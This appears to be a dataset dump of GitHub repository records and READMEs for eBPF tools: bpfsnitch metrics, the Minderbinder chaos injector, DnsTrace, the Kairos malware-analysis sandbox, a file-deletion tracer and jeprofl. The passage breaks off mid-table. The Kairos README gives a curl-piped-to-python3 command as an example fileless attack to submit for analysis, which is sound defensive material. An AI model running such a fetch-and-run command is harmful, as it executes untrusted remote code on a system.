bpfsnitch_network_sent_packets_counter{pod=""kube-proxy-cwn8r"",remote_subnet=""1.2.111.0/24""} 310
bpfsnitch_network_sent_packets_counter{pod=""kube-proxy-cwn8r"",remote_subnet=""1.2.108.0/24""} 65

# HELP bpfsnitch_network_sent_packets_counter Number of packets sent
# TYPE bpfsnitch_network_sent_packets_counter counter
bpfsnitch_network_sent_packets_counter{pod=""kube-proxy-cwn8r"",remote_subnet=""1.2.3.0/24""} 1529
bpfsnitch_network_sent_packets_counter{pod=""kube-proxy-cwn8r"",remote_subnet=""1.2.97.0/24""} 1
bpfsnitch_network_sent_packets_counter{pod=""kube-proxy-cwn8r"",remote_subnet=""1.2.111.0/24""} 3
bpfsnitch_network_sent_packets_counter{pod=""kube-proxy-cwn8r"",remote_subnet=""1.2.108.0/24""} 1

# HELP bpfsnitch_syscall_counter Number of syscalls
# TYPE bpfsnitch_syscall_counter counter
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""arch_prctl""} 520
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""bind""} 2713
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""clone""} 818
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""connect""} 264
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""getrandom""} 578
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""getsockname""} 2845
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""read""} 16424
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""recvmsg""} 56939
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""sendmsg""} 443
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""sendto""} 32007
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""setsockopt""} 819
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""socket""} 2845
bpfsnitch_syscall_counter{pod=""kube-proxy-cwn8r"",syscall=""wait4""} 818
```

## Performance

Starting from v0.1.0, bpfsnitch is built to be lightweight and efficient using eBPF technology. It monitors syscalls and network events at the kernel level, providing real-time insights with minimal system impact.

In production, bpfsnitch typically uses an average of 5ms of CPU per 60-second scrape and maintains a memory footprint of up to `250MB`. It is statically bound to a maximum of `100ms` CPU usage, ensuring consistent performance regardless of system configuration or workload. See the [DaemonSet resources](https://github.com/search?q=repo%3Anullswan/bpfsnitch%20resources&type=code)

To monitor bpfsnitch's performance in real-time, start it with the -pprof flag to expose a pprof server. Access live profiling data at the /debug/pprof route to analyze CPU and memory usage and optimize performance as needed.

We are committed to providing detailed performance benchmarks and optimization tips in future releases to help you maximize bpfsnitch's benefits.

## Configuration (soon)

### Customizing Syscall Monitoring

bpfsnitch comes with a predefined list of syscalls to monitor, focusing on critical operations that could affect system security or stability. We plan to provide a configurable syscall whitelist in future releases, allowing you to tailor monitoring to your specific needs.

#### Predefined Syscalls

```go
var WhitelistedSyscalls = []int{
    SyscallToId[""clone""],
    SyscallToId[""execve""],
    SyscallToId[""mknodat""],
    SyscallToId[""chroot""],
    SyscallToId[""mount""],
    SyscallToId[""umount2""],
    SyscallToId[""pivot_root""],
    SyscallToId[""setuid""],
    SyscallToId[""setgid""],
    ...
```

## Educational Value

bpfsnitch is not only a powerful monitoring tool but also an excellent educational resource. It provides insights into:
- eBPF Programming: Learn how eBPF programs are written and attached to kernel functions.
- System Call Mechanics: Understand how syscalls work and how they impact system behavior.
- Kernel-Level Monitoring: Gain knowledge about low-level monitoring techniques in Linux.
- Observability Practices: Explore how to collect and expose metrics for modern monitoring systems like Prometheus.

## License

bpfsnitch is released under the GNU General Public License (GPL).

## Future Plans

- Configurable Syscall Whitelist: Allow users to define which syscalls to monitor.
- User Interface: Develop a web-based UI for easier visualization and management.
- Performance Optimizations: Enhance the efficiency of data collection and processing.
- Additional Metrics: Include more granular metrics, such as latency measurements and error counts.
- Extended Container Support: Improve compatibility with various container runtimes and orchestration platforms.

## Contact

- Contributor: [@nullswan](https://github.com/nullswan) <pro@nullswan.io>
- Reviewers: [@gmarcha](https://github.com/gmarcha), [@naofel1](https://github.com/naofel1)
- GitHub Issues: [https://github.com/nullswan/bpfsnitch/issues](https://github.com/nullswan/bpfsnitch/issues)

## Acknowledgments

- eBPF Community: For providing extensive resources and support for eBPF development.
- Prometheus: For their powerful monitoring and alerting toolkit.
- Open Source Community: Thanks to all who have contributed to the open-source ecosystem, making projects like bpfsnitch possible.

## Join the Community

If you find bpfsnitch valuable, please give us a â­ star on GitHub and share it with others who might be interested. Your support helps us improve and grow the project!

Feel free to reach out if you have any questions or need assistance getting started with bpfsnitch. We look forward to your feedback!
"
scottgerring/minderbinder,65,0,65,0,Go,Use eBPF to inject chaos into local processes,2024-08-27T15:24:39Z,2025-07-17T13:17:54Z,9,"# Minderbinder

[![PR Check](https://github.com/scottgerring/minderbinder/actions/workflows/ci.yaml/badge.svg)](https://github.com/scottgerring/minderbinder/actions/workflows/ci.yaml)

_â€œYossarian also thought Milo was a jerk; but he also know that Milo was a genius.â€_

## What is this?
Minderbinder is a tool that uses eBPF to inject failures into running processes. 
Presently it can inject failures into **system calls** by attaching kprobes to the system call handler and failures into **outgoing network traffic** by attaching a traffic filter to Linux's traffic control subsystem. 

You can read a bit more about the motiviation and implementation details [in this blog entry](https://blog.scottgerring.com/introducing-minderbinder/ ). 

## What's it for?
Minderbinder aims to make it easy to generically inject failures into processes. At the moment you can write a config.yaml that describes the failures to inject and the processes to inject them into, start minderbinder, and see what happens. 

<details>
<summary>Video demo</summary>
	
[demo](https://github.com/user-attachments/assets/73cc8c3e-c447-4e0f-95c4-2e15d3f5fe70)

</details>

## Running Minderbinder
Check out [config.yaml](config.yaml) for a complete example. Minderbinder supports two different interventions - `syscall` and `outgoing_network`:

```yaml
agents_of_chaos:
  syscall:  
    # Stop curl from using `openat`
    - name: break_curl_openat
      syscall: openat
      ret_code: -2 # NOENT / no such file or directory
      targets:
        - process_name: curl
      delay_ms: 100 # Milliseconds to wait after the process starts. For openat, this gives the process a chance to start properly.
      failure_rate: 100
  outgoing_network:
    - name: break_wget_network
      targets:
        - process_name: wget
      delay_ms: 100 # Milliseconds. In this case, 100ms should be enough to get a DNS request through for the endpoint, before breaking the actual transfer to the HTTP server
      failure_rate: 100      
```

To run minderbinder, you specify the configuration file, and if you are using `outgoing_network`, the interface to attach to:
 ```bash
sudo ./minderbinder --interface enp67s0 config.yaml
```

Note: The graphs that pop up show general system call behaviour across the monitored values, and don't directly reflect the
actions minderbinder is performing on the targeted processes.

## How's it work?

Here's a helpful diagram! At a high level, the flow is:

* The user-space app reads the configuration file, attaches necessary probes, and writes the configuration into `syscall_target_config` and `outgoing_network_config` eBPF maps
* The `execve` kprobes catch new processes launching. Upon finding processes that match targets in the `_config` maps, they add the PID data to the target configuration and update the corresponding `_target` map. For example, a matched element in `syscall_target_config` leads to a PID+target configuration being added to `syscall_targets`
* The eBPF responsible for each module then fires for its particular hooks, and upon finding a relevant entry in its `_targets` map, and ""breaks"" the operation being considered accordingly

```mermaid
graph LR
    classDef mapClass fill:#f9f,stroke:#333,stroke-width:2px;
    classDef probeClass fill:#bbf,stroke:#333,stroke-width:2px;
    classDef mapLink stroke:#f9f,stroke-width:2px,stroke-dasharray: 5, 5;
    classDef defaultClass fill:#fff,stroke:#333,stroke-width:2px;

    subgraph ""Configuration Maps""
        A[syscall_target_config]:::mapClass
        D[outgoing_network_config]:::mapClass
    end

    subgraph ""App - Configuration Loading""
        F[Load Configuration]
        G[Load Syscall Targets]
        H[Load Outgoing Net Targets]

        F --> G --> A
        F --> H --> D
    end 

    subgraph ""Runtime Maps""
        B[syscall_targets]:::mapClass
        E[outgoing_network_targets]:::mapClass
    end

    subgraph ""execve Process Targeting""
        C[execve_data]:::mapClass
        L[""Is Syscall Target?""]
        M[""Is Outgoing Net Target?""]

        I[""kprobe(execve)""]:::probeClass --> J[""Record parent details""] --> C
        K[""kretprobe(execve)""]:::probeClass --> L
        K --> M
        A -.-> L
        D -.-> M
        C -.-> L
        C -.-> M
        L --> B
        M --> E
    end

    subgraph ""syscall Module""
         N[""kprobe(targeted_syscall)""]:::probeClass 
         N --> O[""Targeted process?""]
         B -.-> O
         O --> P[""Delay past?""]
         P --> Q[""Random chance met?""]
         Q --> R[""bpf_override_return(err)""]
    end

   subgraph ""TC Module""
        X[""cgroup(sock_create)""]:::probeClass
        X --> Y[""Targeted process?""]
        E -.->Y
        Y --> Z[""Set socket mark""]

         S[""tc(filter)""]:::probeClass 
         S --> T[""Socket mark set?""]
         E -.-> T
         T --> U[""Delay past?""]
         U --> V[""Random chance met?""]
         V --> W[""return TC_ACT_STOLEN""]
    end
```


## Big Picture

The long-term goal is to provide a back-end for existing unit test frameworks, so that we can write component tests that can trivially break the code under test in interesting, chaos-related fashions. This might look something like this:

```go
func TestYourAPIHandler_DownstreamFailure(t *testing.T) {
	// Create a new request
	req := httptest.NewRequest(http.MethodGet, ""/your-api-endpoint"", nil)

	// Record the response
	rec := httptest.NewRecorder()

	// Failure configuration
	cfg := FailureConfig{
		OutgoingNetwork: [] OutgoingNetworkFailure {
            {
                Protocol: ""TCP"",
                DestPort: 443,
                FailureRate: 100
            }
        }
	}

	// Wrap the actual handler call with Minderbinder. Because Minderbinder is injecting
    // failures into this process using eBPF, we don't need to elaborately craft stubs here;
    // we can setup the 
    minderbinder := &Minderbinder{}
	minderbinder.WithFailures(cfg, func() (*http.Response, error) {
		// Call the API handler
		YourAPIHandler(rec, req)
		return nil
	})

	// We should get a 502 / bad gateway back
	assert.Equal(t, http.StatusBadGateway, rec.Code)
	assert.Equal(t, ""Downstream service failed\n"", rec.Body.String())
}

```

This gives us a mechanism to test our application and services resiliance in the face of failures. Traditionally we would do this either by extensively stubbing _all_ the interesting interfaces around the application and injecting failures, or, using some chaos engineering tool to inject failures into the entire aggregate system in a deployed cloud environment. Because Minderbinder leverages eBPF for the failure injection, the code needed for each supported language would be straightforward, as it would simply have to configure the native minderbinder component.

"
edgecase1/ebpf-can,4,0,4,0,Shell,,2024-09-07T19:08:04Z,2025-05-27T09:53:16Z,20,"
* [can-xdp-starter](./can-xdp-starter/): a toy example to show how to use an eBPF program with the XDP hook
* [can-tc-starter](./can-tc-starter): a sample program how to attach eBPF to the traffic control 
* [can-xdp-filter](./can-xdp-filter/): eBPF program to filter CAN frames on XDP
* can-gw2: we can't use eBPF to do a bpf\_redict, because the Kernel expect a L2 frame. TODO?
"
takehaya/Sys-Ebpf,32,2,32,1,Perl,"Sys::Ebpf is a pure-perl library to read, modify and load eBPF programs and attach them to various hooks in the Linux kernel.In other words eBPF Loader for written in Perl.",2024-07-03T18:47:46Z,2025-03-27T02:40:13Z,90,"[![Actions Status](https://github.com/takehaya/perl-ebpf/actions/workflows/test.yml/badge.svg)](https://github.com/takehaya/perl-ebpf/actions)
# NAME

ebpf - Pure-Perl interface for eBPF (extended Berkeley Packet Filter)

# SYNOPSIS

    use strict;
    use warnings;
    use utf8;
    use Sys::Ebpf::Loader;
    use Sys::Ebpf::Link::Perf::Kprobe;

    my $file   = ""kprobe.o"";
    my $loader = Sys::Ebpf::Loader->new($file);
    my $data   = $loader->load_elf();
    my $kprobe_fn = ""kprobe/sys_execve"";

    my ( $map_data, $prog_fd ) = $loader->load_bpf($kprobe_fn);
    my $map_kprobe_map = $map_data->{kprobe_map};
    $map_kprobe_map->{key_schema}   = [ [ 'kprobe_map_key',   'uint32' ], ];
    $map_kprobe_map->{value_schema} = [ [ 'kprobe_map_value', 'uint64' ], ];

    my $kprobe_info = Sys::Ebpf::Link::Perf::Kprobe::attach_kprobe( $prog_fd, $kprobe_fn );

    while (1) {
        my $key   = { kprobe_map_key => 0 };
        my $value = $map_kprobe_map->lookup($key);
        if ( defined $value ) {
            print Dumper($value);
            printf ""%s called %d times\n"", $kprobe_fn, $value->{kprobe_map_value};
        }
        else {
            warn ""Failed to read map value\n"";
        }
        sleep(1);
    }

# DESCRIPTION

The `ebpf` module provides a Perl interface for working with eBPF (extended Berkeley Packet Filter)
on Linux systems. It allows you to load eBPF programs, create and manipulate BPF maps, and interact
with the eBPF subsystem directly from Perl.

This module includes several submodules:

- `Sys::Ebpf::Loader` - For loading eBPF programs and maps
- `Sys::Ebpf::Asm` - eBPF assembly helpers
- `Sys::Ebpf::Reader` - For reading ELF files
- `Sys::Ebpf::Elf::Parser` - For parsing ELF files
- `Sys::Ebpf::Link::Netlink` - For calling BPF-related netlink commands(e.g. XDP)
- `Sys::Ebpf::Link::Perf` - For calling BPF-related perf events(e.g. kprobes)

# FUNCTIONS

This module primarily serves as a namespace and version container for its submodules.
Refer to the documentation of individual submodules for specific functions and usage.

# SEE ALSO

- [Sys::Ebpf::loader](https://metacpan.org/pod/Sys%3A%3AEbpf%3A%3Aloader)
- [Sys::Ebpf::asm](https://metacpan.org/pod/Sys%3A%3AEbpf%3A%3Aasm)
- `Sys::Ebpf::reader` - For reading ELF files
- `Sys::Ebpf::elf::parser` - For parsing ELF files

# AUTHOR

TAKERU HAYASAKA <hayatake396@gmail.com>

# LICENSE AND COPYRIGHT

Copyright (C) 2024 TAKERU HAYASAKA

This program is free software; you can redistribute it and/or modify it
under the terms of either: the GNU General Public License as published
by the Free Software Foundation; or the Artistic License.

See [http://dev.perl.org/licenses/](http://dev.perl.org/licenses/) for more information.
"
furkanonder/DnsTrace,175,10,175,0,Python,Monitor DNS queries by host processes using eBPF!,2024-10-01T22:58:22Z,2025-10-08T20:52:03Z,42,"<div align=""center"">
  <h2>DnsTrace</h2>
  <h3> Monitor DNS queries by host processes using eBPF!</h3>
  <a href=""https://github.com/furkanonder/dnstrace/issues""><img alt=""GitHub issues"" src=""https://img.shields.io/github/issues/furkanonder/dnstrace""></a>
  <a href=""https://github.com/furkanonder/dnstrace/stargazers""><img alt=""GitHub stars"" src=""https://img.shields.io/github/stars/furkanonder/dnstrace""></a>
  <a href=""https://github.com/furkanonder/dnstrace/blob/main/LICENSE""><img alt=""GitHub license"" src=""https://img.shields.io/github/license/furkanonder/dnstrace""></a>
  <a href=""https://pepy.tech/project/dnstrace""><img alt=""Downloads"" src=""https://pepy.tech/badge/dnstrace""></a>
</div>

![Demo](assets/demo.gif)

## Quick Start

### Prerequisites

DnsTrace requires BCC (BPF Compiler Collection) to be installed on your system. Follow the [BCC installation guide](https://github.com/iovisor/bcc/blob/master/INSTALL.md) for your Linux distribution.

### Installation

Install DnsTrace using pipx:

```bash
pipx install dnstrace
```

### Usage

Run DnsTrace with root privileges:

```bash
sudo dnstrace
```

#### Command Line Options

```bash
sudo dnstrace [OPTIONS]

Options:
  -t, --tail     Stream live DNS queries (tail mode)
  -d, --domain   Show DNS query domains
  -h, --help     Show help message
```

#### Examples

**Basic monitoring:**
```bash
sudo dnstrace
```

**Stream live queries:**
```bash
sudo dnstrace --tail
```

**Show domains with live-streaming:**
```bash
sudo dnstrace --tail --domain
```

## ðŸ“Š Display Modes

### Table Mode (Default)
- Real-time statistics dashboard
- Query type distribution charts
- Process attribution and interface details
- Responsive column layout

### Tail Mode (`--tail`)
- Live-streaming of DNS queries
- Optional domain display with `--domain` flag
"
recontech404/Kairos,52,5,52,0,Go,Open Source eBPF Malware Analysis Framework,2024-10-01T14:51:30Z,2025-10-02T21:05:06Z,9,"<div align=""center"">
  <h1 align=""center"">Kairos</h1>
  <h3>An Open Source eBPF Malware Analysis Framework</h3>
</div>
<div align=""center"">
  <a> <img alt=""License"" src=""https://img.shields.io/badge/license-AGPLv3-purple""></a>
</div>

## Features
- **eBPF Event Capturing** Automatically records relevant eBPF tracepoints used by the malware
- **LLM Event Analysis** Requests a LLM analysis to provide a human readable summary of the events
- **C2 Traffic Capture:** Records all incoming and outgoing network connections
- **DNS Capture:** Records all domains from DNS requests
- **SSL Traffic Capture:** Records data sent and recieved from SSL libraries without any modification to the binary *before* encryption using eBPF
- **File-less Malware Support:** Supports file-less malware such as pyloose where there is no binary file
- **Website Interface:** Upload and view malware samples from the browser 


<br>

![Mirai Nerfed](/Docs/kairos-mirai.gif)

![Pyloose](/Docs/kairos-pyloose.gif)


https://github.com/user-attachments/assets/61c858c2-91c7-4be0-9dc2-4b12e50333ad


https://github.com/user-attachments/assets/d9aeccce-3b5e-489d-8d84-ba0435122c9c


## Tech Stack

- [libbpfgo](https://github.com/aquasecurity/libbpfgo) â€“ eBPF library for Go
- [ollama](https://github.com/ollama/ollama) â€“ Self hosted LLM provider 

## Getting Started

### Prerequisites

- Debian Machine (tested with Ubuntu 22.04 LTS)
- Golang [Install](https://go.dev/doc/install) 
- Ollama [Install](https://github.com/ollama/ollama?tab=readme-ov-file#linux) (24GB VRAM recommended)
- Docker & Docker-Compose [Install](https://docs.docker.com/engine/install/debian/)

#### Ollama Model Setup
On the Ollama host pull the llama3.1:8b model
```shell
ollama pull llama3.1:8b
```

### 1. Clone the repository
```shell
git clone git@github.com:recontech404/Kairos.git
cd Kairos
```

### 2. Install dependencies (for Debian)
```shell
sudo apt install build-essential libbpf-dev clang linux-tools-$(uname -r)
```

#### *Note:* Modify the env values for network in the docker-compose.yml's if needed

### 3. Build and deploy the Server in docker (populate Ollama host first in build/docker-compose.yml)
```shell
cd Server
make build && make deploy
```

### 4. Build and deploy the UI in docker (from root dir)
```shell
cd UI/kairos-ui
make build && make deploy
```
### 5. Build the Runner (from root dir) -- see [Arm64](#arm64-runner-details) for building on arm64
```shell
cd Runner
make
```

#### Note: when running the *make* command in the Runner folder for the first time, you will may need to re-install the *correct* linux headers for bpf for your kernel version if the make command fails:
```shell
WARNING: bpftool not found for kernel 6.5.0-44

  You may need to install the following packages for this specific kernel:
    linux-tools-6.5.0-44-generic
    linux-cloud-tools-6.5.0-44-generic

  You may also want to install one of the following packages to keep up to date:
    linux-tools-generic
    linux-cloud-tools-generic

->example fix: sudo apt install linux-tools-6.5.0-44-generic
```
### 6. Start the Runner (modify makefile run phony if you modified the server listen address/port)

```shell
make run
```

### Note: 

#### For testing this is done on the same machine as the Server and UI, but the *main* binary and *eBPF/main.bpf.o* can be copied to a VM or another machine (see [Runner Future State](#runner-future-state) for more info)
#### Ensure that the *main.bpf.o* is in a subfolder called *eBPF/* and then the command

```shell
sudo WS_ADDRESS=127.0.0.1 WS_PORT=8080 SKIP_VERIFY_TLS=TRUE ./main
```



#### If you wish to enable verbose logging you can add the LOG_V=TRUE env value. If you are running the server with a certificate you can enable TLS verfication

### 7. Open the app in your browser
Visit [http://localhost:8000](http://localhost:8000) in your browser

## How To Use Kairos

 - With a Runner connected, click `Add Job` from the webUI and populate the values and click `Submit`. 

#### Field Explanations
  - Name: is optional and is only for the user's reference in the UI
  - amd64/arm64: toggle is for selecting a runner with that architecture
  - Keep runner alive: this will keep the runner online after a job (for DFIR) but will not accept new jobs until after a restart 
  - Run Duration: determines how long the runner will run the malware and collect events before terminating (keep in mind that long run times will bypass LLM context length)
  - Run Command: Allows running a shell command instead of uploading a binary file
    - Run Command Args: is the shell command for the file-less malware i.e. `curl 192.168.8.12/10131 | python3` would be an example pyloose attack
    - Bin Exclusion: for the curl example, we know `curl` to be a benign binary and are not interested in the eBPF events so we can add `curl` to the Bin Exclusion input
      - This is a space separated list and the exclusion with match on substring, so you can add `curl` or `/usr/bin/curl` either will work
  - Malware File: allows you to upload a binary file
  - File Args: allows you to pass args to the binary file
    - These are space separated and quote grouped so `server --host 0.0.0.0 --port 8080` is acceptable input or `""-u user"" ""-p pass""` is another example if you want grouped
  - Save CMD Output: Saves the raw command line output from the exe (more of a nice to have sometimes)
    - Usually leave this disabled if you are running a file-less exploit as you will only see the output from the first command i.e. `curl` 
  - Override System Prompt: This allows you to modify the LLM system prompt if you want to add more context into the analysis 
    - This input is saved for every LLM analysis retry as well.

---
### System Settings
  - If you wish to modify the LLM parameters you can click `Settings` and modify the values
    - The name again is just for the user benefit currently, future state would be multiple ""profiles"" for different models
    - Model must be a valid ollama model, default is llama3.1:8b due to its 128k context length
    - Context Length: Default is 20000, but you may have to lower if less VRAM is available. Or raise it if you have more
    - System Prompt: The system prompt that is passed along with the ebpf events to the LLM
      - You can modify this and/or any of these other values and click the Re-LLM button and the new settings will be used for analysis
      - If the System Prompt Override was enabled for a job changing the system prompt will not make a change for re-llm

---

## Arm64 Runner Details
  - Arm64 Runners are fully supported and was tested with a RaspberryPi 4 running a custom kernel 6.6 on Debian 12
  - Most Arm Operating Systems do not come with full eBPF features enabled so you will likely have to build your own kernel with the following features *enabled*
  ```shell
  - CONFIG_DEBUG_INFO_BTF
  - CONFIG_FTRACE_SYSCALLS
  - CONFIG_FUNCTION_TRACER
  - CONFIG_DYNAMIC_FTRACE 
  - CONFIG_UPROBES
  - CONFIG_UPROBE_EVENTS
  ```
  

## Future State
 - Levenshtien algorithm to reduce very similar events (helps with reducing input tokens)
 - Auto-switch on job runner based on ELF type (amd64/arm64)
 - Capture Fork Events separate from main events (llm context length needs to be longer for this to work but tooling is in place)
 - Add support for other syscall tracepoint formats?

### Runner Future State
  - The end goal for the Runner would be to have it reside inside a self-resetting Linux VM (not a container for kernel separation) which auto-starts the Runner on start-up and resets after shutdown. 
  - This way the Runner environment is always the same between runs. (i.e having a snapshot before the run and resetting afterwards back to the snapshot).
  - There are already other projects which have similar sandbox reset functionality, but I have not had time to test or integrate automations with either VirtualBox or Proxmox.
  - Also implement a network capture /mitm attack to capture ssl data which was not caught by the eBPF

<br>

## Architecture
![alt text](Docs/Arch.png)
"
SRodi/ebpf-file-delete-tracer,12,2,12,0,C,"This project demonstrates the use of eBPF (Extended Berkeley Packet Filter) to trace file deletion events on a Linux system. A Go userspace application loads the eBPF program from an ELF file, and attaches it to the appropriate kernel hooks to monitor file deletions.",2024-09-27T06:56:29Z,2025-10-02T12:46:42Z,7,"# eBPF file-delete tracer

## Overview
This project demonstrates the use of eBPF (Extended Berkeley Packet Filter) to trace file deletion events on a Linux system. The eBPF program is loaded from an ELF file and attached to the appropriate kernel hooks to monitor file deletions.

## Demo

[Watch the video](https://srodi.fra1.cdn.digitaloceanspaces.com/demo.MP4) for a short demonstration of this tool in action.

## Prerequisites
- Go (version 1.16 or higher)
- Linux system with eBPF support
- `clang` and `llvm` for compiling eBPF programs
- `libbpf` library
- `bpftool` command-line tool to inspect and manage BPF objects

## Installation
1. **Install Go**: Follow the instructions on the [official Go website](https://golang.org/doc/install). In Ubuntu/Debian you can also install go as follows:
    ```sh
    sudo apt install golang-go
    echo 'export GOPATH=$HOME/go' >> ~/.profile
    echo 'export PATH=$GOPATH/bin:$PATH' >> ~/.profile
    source ~/.profile
    ```
2. **Install clang and llvm**:
    ```sh
    sudo apt-get install clang llvm
    ```
3. **Install libbpf**:
    ```sh
    sudo apt-get install libbpf-dev
    ```
4. **Clone the repository**:
    ```sh
    git clone https://github.com/srodi/ebpf-file-delete-tracer.git
    cd ebpf-file-delete-tracer
    ```

## Usage
1. **Compile the eBPF program**:
    ```sh
    clang -O2 -g -target bpf -c trace_file_delete.c -o trace_file_delete.o
    ```
2. **Run the Go program**:
    ```sh
    sudo go run main.go
    ```

## Code Explanation

The implementation for the eBPF program is found in [trace_file_delete.c](trace_file_delete.c) and the implementation for the user space application is in [main.go](main.go).

## Trace File Delete eBPF Program

This eBPF program is designed to trace the `unlinkat` system call, which is used to delete files in the Linux operating system. The program captures and logs details about the process performing the deletion and the file being deleted. Below is a detailed description of the key components and functionality of the program:

1. **Header Inclusions**:
    - `vmlinux.h`: Includes kernel structures and definitions.
    - `bpf_helpers.h`, `bpf_tracing.h`, `bpf_core_read.h`: Include BPF-specific functions and helpers.

2. **Event Structure**:
    - Defines a structure `event` to hold the data that will be sent to user space. This includes:
        - `pid`: Process ID of the process performing the deletion.
        - `comm`: Command name (process name).
        - `filename`: Name of the file being deleted.

3. **BPF Map**:
    - Defines a BPF map `events` of type `BPF_MAP_TYPE_PERF_EVENT_ARRAY` to send events to user space. This map can hold up to 1024 entries.

4. **Tracepoint**:
    - Attaches to the `sys_enter_unlinkat` tracepoint, which is triggered when the `unlinkat` system call is invoked.
    - In the tracepoint handler `trace_unlinkat`:
        - Initializes an `event` structure.
        - Retrieves the current process ID and command name.
        - Reads the filename argument from user space.
        - Outputs the event to user space using `bpf_perf_event_output`.

5. **License**:
    - Specifies the license for the eBPF program as GPL.

## Main Go File for eBPF Program

This Go file sets up an eBPF program to monitor and prevent file deletions. The program performs the following steps:

1. **Set RLIMIT_MEMLOCK Resource Limit**:
    - Adjusts the RLIMIT_MEMLOCK resource limit to allow locking memory for eBPF.
    - Uses `unix.Setrlimit` to set the RLIMIT_MEMLOCK resource limit to memLockLimit which is set to 64 MiB.

2. **Load eBPF Program**:
    - Loads the compiled eBPF program from an ELF file specified by `bpfProgPath`.
    - Uses `ebpf.LoadCollectionSpec` to load the eBPF program from the specified ELF file.

3. **Create eBPF Collection**:
    - Creates a new eBPF collection from the loaded program.
    - Uses `ebpf.NewCollection` to create a new eBPF collection from the loaded program.

4. **Attach eBPF Program to Tracepoint**:
    - Attaches the eBPF program to the `sys_enter_unlinkat` tracepoint to monitor file deletions.
    - Uses `link.Tracepoint` to attach the eBPF program to the `sys_enter_unlinkat` tracepoint.

5. **Set Up Perf Event Reader**:
    - Sets up a perf event reader to read events generated by the eBPF program.
    - Uses `perf.NewReader` to create a perf event reader for the `events` map in the eBPF collection.

6. **Handle System Signals**:
    - Handles system signals (SIGINT, SIGTERM) for graceful shutdown.
    - Uses `os.Signal` and `syscall` to handle SIGINT and SIGTERM signals for graceful shutdown.

7. **Read and Print eBPF Program Output**:
    - Reads and prints the output from the eBPF program (perf event reader), which includes the PID, command, and filename of the process attempting to delete a file.

This file is essential for setting up and running the eBPF program to monitor file deletions on a Linux system.

## Contributing
We welcome contributions! Please follow these steps:
1. Fork the repository.
2. Create a new branch (`git checkout -b feature-branch`).
3. Make your changes.
4. Commit your changes (`git commit -am 'Add new feature'`).
5. Push to the branch (`git push origin feature-branch`).
6. Create a new Pull Request.

## License
This project is licensed under the Apache 2.0 License. See the [LICENSE](LICENSE) file for details.

---

# Environment set-up on WSL2 - Ubuntu-24.04

Update the package lists for upgrades and new package installations, and upgrade all installed packages to their latest versions without prompting for confirmation.
```sh
sudo apt update && sudo apt upgrade --yes
```

Install the libbpf development library and search for the file named `""bpf_helpers.h""` within the `/usr/include` directory.

```sh
sudo apt install libbpf-dev
find /usr/include -name ""bpf_helpers.h""
```

Ensure that the BPF filesystem is mounted 

```sh
sudo mount -t bpf bpf /sys/fs/bpf/
```

---

# bpftool

`bpftool` is a utility for inspection and manipulation of eBPF programs and maps on a Linux system. It allows users to load, verify, and attach eBPF programs, as well as query and update eBPF maps. For more information, refer to the [libbpf/bpftool GitHub repo](https://github.com/libbpf/bpftool)


## Quickstart

Install and use `bpftool`. 4. In Linux distributions this package is provided by `linux-tools-common`

```sh
sudo apt-get install linux-tools-common
```

If you are using `WSL2` you will have to install `bpftool` manually

```sh
git clone --recurse-submodules https://github.com/libbpf/bpftool.git
cd bpftool/src
sudo make install
```

Generate `vmlinux.h` using `bpftools`

```sh
bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
```

## Compile and load eBPF program

Compile the `C` code 

```sh
clang -O2 -g -target bpf -c trace_file_delete.c -o trace_file_delete.o
```

Load the BPF Program using `bpftool` - this command will also `attach` the program to `tracepoint/syscalls/sys_enter_unlinkat`

```sh
sudo bpftool prog load trace_file_delete.o /sys/fs/bpf/trace_unlinkat autoattach
```

Show loaded BPF program details in `json` format

```sh
sudo bpftool --json --pretty prog show |jq -r '.[] | select(.name==""trace_unlinkat"")'
```

## Development iterations

To detach the program and remove the pinned file (prior to re-compiling `C` code)

```sh
sudo rm /sys/fs/bpf/trace_unlinkat
```

---

# Debug

You can add arbitrary print statements in the ebpf program as follows

```c
// debug sending output at /sys/kernel/debug/tracing/trace_pipe
bpf_printk(""PID: %d, COMM: %s, FILENAME: %s\n"", evt.pid, evt.comm, evt.filename);
```

You can view the debug log at `/sys/kernel/debug/tracing/trace_pipe`

```sh
â¯ sudo cat /sys/kernel/debug/tracing/trace_pipe | grep -i bpf_trace_printk            
           <...>-138718  [010] ....1 32416.629533: bpf_trace_printk: PID: 138718, COMM: rm, FILENAME: some
```

Check for kernel logs errors

```sh
dmesg | tail
```
"
0xdeafbeef/jeprofl,91,2,91,2,Rust,Allocations profiler built using ebpf,2024-09-22T21:12:08Z,2025-07-19T02:18:05Z,10,"# jeprofl

jeprofl is a memory allocation profiling tool that uses eBPF technology to
analyze jemalloc allocations in your program. It may work with other
allocators, but this has not been tested.

[![colorized flamegraph output](assets/flamegraph.png)](assets/flamegraph.svg)

It can be used with already running program without recompilation.
Overhead with 1000x sampling is 80 ns per call under 2.5M allocations / sec.
![bpftop.png](assets/bpftop.png)

## Features

- Attach to a specific process or program
- Support for various jemalloc allocation functions (malloc, calloc, realloc,
  etc.)
- Order results by allocation count or total memory traffic
- Set minimum and maximum allocation sizes to track
- Configurable event sampling
- Generate CSV output and flame graphs
- Tracks allocation histograms per stack trace (rounded to power of 2)

```
6ae5a0 - malloc
4e54b0 - uu_ls::enter_directory
4e54b0 - uu_ls::enter_directory
4e54b0 - uu_ls::enter_directory
4e54b0 - uu_ls::enter_directory
4db790 - uu_ls::list
23b070 - uu_ls::uumain
bb560  - coreutils::main
1c9e60 - std::sys::backtrace::__rust_begin_short_backtrace
bdf00  - main
2a010  - __libc_start_call_main
2a0c0  - __libc_start_main_alias_2
a7f00  - _start

-----------+-----------+------------+--------------------------------------------------
Size       | Count     | Percentage | Distribution
-----------+-----------+------------+--------------------------------------------------
1 B        |     16870 |      4.23% | #######
